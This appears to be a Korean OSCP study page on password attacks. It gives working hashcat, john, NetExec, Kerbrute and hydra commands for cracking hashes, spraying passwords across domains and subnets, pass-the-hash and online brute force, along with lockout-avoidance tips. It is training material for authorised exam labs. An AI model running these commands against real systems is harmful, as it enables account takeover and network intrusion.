---
title: 패스워드 공격
tags:
  - oscp
---

# 패스워드 공격 { #password-attacks }

<div class="dfir-meta" markdown>
**적용 범위:** standalone과 AD 세트 · **우선순위:** 높음 · **최종 수정:** 2026-11-03
</div>

!!! abstract "한 문장 요약"
    해시 종류를 알아내고, 맞는 크랙 모드를 골라 hashcat / john으로 오프라인 크랙 — 온라인 스프레이는 조심해서. 계정 잠금 한 번이 AD 세트 전체를 날릴 수 있어요.

## 1. 개념 { #concept }

| 공격 | 대상 | 위험 | 도구 |
|---|---|---|---|
| **오프라인 크랙** | 덤프 / roast / 캡처한 해시 | 대상엔 없음 | hashcat, john |
| **패스워드 스프레이** | 비밀번호 하나 × 사용자 여럿 | 계정 잠금 | NetExec, Kerbrute |
| **브루트포스** | 비밀번호 여럿 × 사용자 하나 | 잠금, 느림, 시끄러움 | hydra, NetExec |
| **재사용 / pass-the-hash** | 찾은 크리덴셜을 모든 서비스에 | 낮음 | NetExec, evil-winrm, Impacket |

시험에서의 우선순위: **재사용 먼저, 오프라인 크랙 둘째, 스프레이 셋째, 브루트포스 마지막.**

## 2. 주요 도구 { #tools }

| 도구 | 용도 | 시험 허용 여부 |
|---|---|---|
| **hashcat** | GPU/CPU 오프라인 크랙, 룰 | 허용 |
| **john** + `*2john` 스크립트 | 파일 형식(ZIP, SSH 키, KeePass, PDF) 크랙, 빠른 실행 | 허용 |
| **hydra** | 온라인 브루트포스: SSH, FTP, HTTP 폼, RDP 등 | 허용 |
| **NetExec** | SMB / WinRM / LDAP / MSSQL / RDP 스프레이, 해시 재사용 | 허용 |
| **Kerbrute** | Kerberos 사용자 확인과 스프레이 | 허용 |
| **hashid / hashcat `--identify`** | 이게 무슨 해시인가? | 허용 |

## 3. 시나리오 { #scenarios }

### 3.1 해시 식별 { #identify }

```bash
hashcat --identify hash.txt
hashid -m 'HASH_HERE'
```

| 해시 | 생김새 | hashcat `-m` | john `--format` |
|---|---|---|---|
| MD5 | 16진수 32자 | 0 | raw-md5 |
| SHA1 | 16진수 40자 | 100 | raw-sha1 |
| SHA-256 | 16진수 64자 | 1400 | raw-sha256 |
| md5crypt | `$1$...` | 500 | md5crypt |
| sha512crypt (`/etc/shadow`) | `$6$...` | 1800 | sha512crypt |
| bcrypt | `$2y$` / `$2a$` | 3200 | bcrypt |
| NTLM | 16진수 32자 (SAM / secretsdump) | 1000 | nt |
| NetNTLMv2 | `user::DOMAIN:challenge:...` | 5600 | netntlmv2 |
| Kerberoast RC4 / AES256 | `$krb5tgs$23$` / `$krb5tgs$18$` | 13100 / 19700 | krb5tgs |
| AS-REP | `$krb5asrep$23$` | 18200 | krb5asrep |
| DCC2 (캐시된 도메인 로그온) | `$DCC2$10240#user#...` | 2100 | mscash2 |
| KeePass | `keepass2john` 출력 | 13400 | KeePass |

### 3.2 hashcat — 오프라인 크랙 { #hashcat }

**상황:** `GetUserSPNs` 로 얻은 `kerb.hash`, 또는 `secretsdump` 의 NTLM 해시가 있음.

```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerb.hash --show                 # 이미 풀렸나?
hashcat -m 1000 ntlm.txt rockyou.txt --username   # 입력 줄이 "user:hash" 형식일 때
```

**볼 것:** `Status...........: Cracked` 와 `hash:password` 줄; `Exhausted` → 룰이나 커스텀 워드리스트를 써 보거나, 풀리라고 만든 해시가 아니라고 받아들이기.

**다음:** 그 비밀번호를 어디서나 시험(3.5). 안 풀리는 NTLM 해시도 쓸 수 있어요 — 크랙 대신 **pass** 하세요.

!!! tip "GPU 없는 VM에서는"
    CPU hashcat은 `-m 1800`(sha512crypt)과 `-m 3200`(bcrypt)에서 느립니다. OSCP의 의도된 비밀번호는 거의 항상 `rockyou.txt` 에 있어요. 느린 해시가 10분 안에 안 풀리면 몇 시간 기다리기보다 다른 경로를 찾으세요.

### 3.3 john — 파일과 형식 { #john }

**상황:** 보호된 파일: `backup.zip`, 패스프레이즈가 걸린 `id_rsa`, `Database.kdbx`, PDF.

```bash
zip2john backup.zip > zip.hash
ssh2john id_rsa > ssh.hash
keepass2john Database.kdbx > kp.hash
pdf2john file.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
john --show kp.hash
```

**다음:** KeePass → `kpcli` 나 KeePassXC로 열어 모든 항목을 읽기(보통 다음 크리덴셜이 있음); SSH 키 → `ssh -i id_rsa user@$IP`.

`/etc/shadow` + `/etc/passwd`: `unshadow passwd shadow > unsh.txt; john --wordlist=rockyou.txt unsh.txt`.

### 3.4 커스텀 워드리스트 { #wordlists }

**상황:** `rockyou.txt` 로 실패했지만 대상에 테마(회사 이름, 제품, 계절)가 있음.

```bash
cewl http://$IP -d 2 -m 5 -w loot/cewl.txt                     # 웹사이트의 단어
hashcat --stdout loot/cewl.txt -r /usr/share/hashcat/rules/best64.rule > loot/mutated.txt
printf 'Spring2026!\nSummer2026!\nAutumn2026!\nFall2026!\nWinter2026!\nCompany123!\n' > loot/seasons.txt
```

### 3.5 크리덴셜 재사용과 스프레이 — NetExec { #spraying }

**상황:** 비밀번호 하나를 풀었거나 AD 세트에서 하나를 받았고, 사용자 목록이 있음.

```bash
# 정책부터 꼭 읽기
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol

# 비밀번호 하나, 모든 사용자 (도메인)
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success
# 크리덴셜 하나, 모든 호스트와 프로토콜
nxc smb 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc winrm 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc mssql 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc rdp 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
# 로컬 계정 (여러 호스트에 같은 로컬 관리자 비밀번호)
nxc smb 10.10.120.0/24 -u administrator -H <NT> --local-auth
# 사용자 이름 = 비밀번호
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**볼 것:**

- `[+] CORP\svc_web:Found_Pass1` → 유효.
- `(Pwn3d!)` → 로컬 관리자 → 그 호스트에 secretsdump / psexec / wmiexec.
- `STATUS_PASSWORD_EXPIRED` / `STATUS_ACCOUNT_RESTRICTION` → 비밀번호는 맞지만 제한이 있음(다른 프로토콜을 시도하거나, 만료된 건 `smbpasswd -r` 로 변경).
- `STATUS_ACCOUNT_LOCKED_OUT` → **스프레이 중단.**

!!! warning "잠금 계산"
    `Account Lockout Threshold: 5` 에 관찰 창이 30분이면 → 사용자당 30분에 **최대 4번**, 이미 시도한 횟수 포함. `Threshold: 0` / `None` → 잠금 없음. 확신이 없으면 비밀번호 하나 뿌리고, 기다리고, 다음 것.

### 3.6 Kerbrute — Kerberos로 사용자 확인과 스프레이 { #kerbrute }

**상황:** DC는 알지만 아직 유효한 사용자가 없음(또는 이름 목록을 빨리 검증하고 싶음).

```bash
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o loot/kb-users.txt
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2026!'
```

**볼 것:** `VALID USERNAME: jdoe@corp.local`; Kerbrute는 pre-auth가 없는 사용자도 표시합니다(→ [AS-REP roast](active-directory.md#asrep)). Kerberos pre-auth 실패도 잠금 횟수에 *들어갑니다* — 같은 잠금 계산이 적용돼요.

### 3.7 hydra — 온라인 브루트포스 { #hydra }

**상황:** 사용자 이름을 알고 잠금이 없는 로그인(SSH, FTP, 웹 폼)이고, 더 나은 게 안 남았음.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
hydra -L users.txt -P passwords.txt ftp://$IP
# HTTP POST 폼 — 필드 이름과 실패 문자열은 Burp에서 복사
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -t 16
# HTTP basic auth
hydra -l admin -P rockyou.txt $IP http-get /admin/
```

**볼 것:** `[22][ssh] host: ... login: admin password: ...`. 오탐이 많으면? 실패 문자열 `F=` 가 틀린 거예요 — Burp에서 응답을 확인하세요.

!!! note "브루트포스는 허용되지만"
    느리고, OSCP에서 의도된 경로인 경우는 거의 없습니다. 확인된 사용자와 적당한 목록(상위 수천 개)으로 제한하고, 정보 수집하는 동안 백그라운드로 돌리세요.

## 4. 자주 하는 실수 { #mistakes }

- **비밀번호 정책을 안 읽고 스프레이** — 주어진 AD 사용자가 잠기면 세트가 끝날 수 있어요.
- **hashcat 모드 틀림**(`13100` vs `19700`, `5600` vs `5500`) → "Token length exception".
- `--username` 없이 해시 파일에 **`user:` 접두사를 남겨 둠.**
- **해시도 크리덴셜이라는 걸 잊음.** SMB / WinRM에서 NTLM은 크랙할 필요가 없어요 — pass 하세요.
- **푼 비밀번호를 다른 사용자에게 안 시도**(계정 간 비밀번호 재사용은 단골).
- 정보 수집 대신 **rockyou로 SSH 브루트포스.**

## 5. 시험 팁 { #exam-tips }

- `creds.txt` 는 `user:password:출처`, `hashes.txt` 는 `user:hash:출처` 로 관리하고, 늘어날 때마다 전체를 다시 뿌리세요.
- hashcat은 tmux 패널 하나에 따로 돌리고 계속 작업하세요.
- 리포트: 각 크리덴셜을 어떻게 얻었는지(파일, 해시 종류, 워드리스트) 적으세요 — 재현성의 일부입니다.

## 관련 페이지 { #related-pages }

- [시험 흐름](exam-workflow.md) · [Active Directory](active-directory.md) · [정찰과 정보 수집](recon-enumeration.md)
- 방어자 관점: [Kerberoasting](../../adversary/kerberoasting.md) · [AS-REP Roasting](../../adversary/asrep-roasting.md) · [Pass-the-Hash](../../adversary/pass-the-hash.md) · [Windows 이벤트 ID](../../basics/windows-event-ids.md) (4625, 4771, 4776)
- [랩: Kerberoasting](labs/kerberoasting.md)

## 참고 자료 { #references }

- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [NetExec wiki](https://www.netexec.wiki/)
- [Kerbrute](https://github.com/ropnop/kerbrute)
